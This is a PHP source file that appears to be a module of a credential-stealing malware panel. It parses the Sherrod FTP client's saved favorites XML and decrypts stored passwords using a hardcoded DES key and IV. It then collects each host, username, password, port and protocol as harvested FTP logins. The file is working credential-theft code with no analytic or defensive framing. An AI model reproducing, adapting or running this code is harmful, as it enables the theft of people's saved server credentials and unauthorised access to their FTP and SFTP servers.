<?php
	class Module_sherrodftp extends Module_
	{
		private function Decrypt($Password)
		{
			$Password = trim($Password);
			if (!strlen($Password))
				return '';

			$KEY_ 	= base64_decode('Zz1o//1yM0o=');
			$IV_ 	= base64_decode('QAroHxawL5k=');

			$Password = base64_decode($Password);
			if (!strlen($Password))
				return '';

			$PlainText = mcrypt_decrypt(MCRYPT_DES, $KEY_, $Password, MCRYPT_MODE_CBC, $IV_);

			$Result = '';
			if (strlen($PlainText))
			{
				$Char = $PlainText[strlen($PlainText)-1];
				while (strlen($PlainText) && ($PlainText[strlen($PlainText)-1] == $Char))
					$PlainText = substr($PlainText, 0, -1);
				$Result = $PlainText;
			}

			return $Result;
		}
		protected function ProcesssherredFTP($Data)
		{
			$Data = remove_utf8_bom($Data);
			$Data = str_replace('<FavoriteSettings xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns="Sherrod.FTP">', '<FavoriteSettings>', $Data);

			$XML_ = simplexml_load_string($Data);
			if(!$XML_)
				return FALSE;

			$Host = Assign_($XML_->Host);
			$Pass = $this->Decrypt($XML_->Password);
			$User = Assign_($XML_->UserName);
			$Port = Assign_($XML_->Port);
			$Prot = Assign_($XML_->Protocol);

			$this->add_ftp($this->append_port($this->ftp_force_ssh($Host, $Prot == "SFTP"), $Port), $User, $Pass);
		}

		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
			case 0:
				$this->ProcesssherredFTP($Data);
				break;
			default:
				return FALSE;
			}

			return TRUE;
		}
	}
